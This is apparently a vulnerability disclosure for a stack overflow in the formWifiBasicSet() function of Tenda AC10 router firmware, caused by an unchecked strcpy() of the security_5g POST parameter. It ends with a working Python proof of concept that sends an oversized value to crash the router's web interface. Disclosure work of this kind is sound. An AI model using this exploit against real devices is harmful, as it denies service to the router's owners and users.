There is a stack overflow vulnerability in the formWifiBasicSet() function in the firmware of tenda router AC10 V15.03.05.19, which can be used by an attacker to perform a denial of service attack

![](https://cdn.nlark.com/yuque/0/2024/png/35465795/1726811576463-98f85e85-4b00-4931-b52a-62d9dd07e193.png)

![](https://cdn.nlark.com/yuque/0/2024/png/35465795/1726813078320-b73b8008-e8f3-400d-9acc-0e7422f74829.png)

<font style="color:rgb(0, 0, 0);background-color:rgb(252, 252, 252);">The strcpy() function does not perform a length check on the parameter</font>

![](https://cdn.nlark.com/yuque/0/2024/png/35465795/1726758840376-3af1e908-4cc4-4011-be76-05b0de3d9902.png)

The parameter src can be passed in by the value of the security_5g via a POST request

![](https://cdn.nlark.com/yuque/0/2024/png/35465795/1726758938644-943b5619-5718-449f-843b-3a91b04a7c98.png)

![](https://cdn.nlark.com/yuque/0/2024/png/35465795/1726759216647-d4e8d4a3-c7ba-4971-9595-4fff199b4190.png)

After testing, filling in the security_5g parameter in the POST request body with 567 characters or more can cause the router web application to crash, resulting in a denial of service attack

![](https://cdn.nlark.com/yuque/0/2024/png/35465795/1726759646247-f342dd90-1d77-4114-9440-ddb38701006a.png)

The web page is inaccessible

![](https://cdn.nlark.com/yuque/0/2024/png/35465795/1726809337650-b2a255c6-a231-48ad-8969-1d37bb2de49c.png)

The POC is as follows:

```python
import requests

url = "http://192.168.246.93/goform/WifiBasicSet"
header = {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Cookie": "password=aav5gk"
}

payload = b"a"*567
data = {
	"wrlEn": "0",
	"wrlEn_5g": "0",
	"security": "none",
	"security_5g": payload,
	"ssid": "",
	"ssid_5g": "",
	"hideSsid": "0",
	"hideSsid_5g": "0",
	"wrlPwd": "",
	"wrlPwd_5g": ""
}
response = requests.post(url, headers=header, data=data, timeout=300)
#response = requests.post(url, headers=header, data=data, timeout=5)
print(response.text)
```

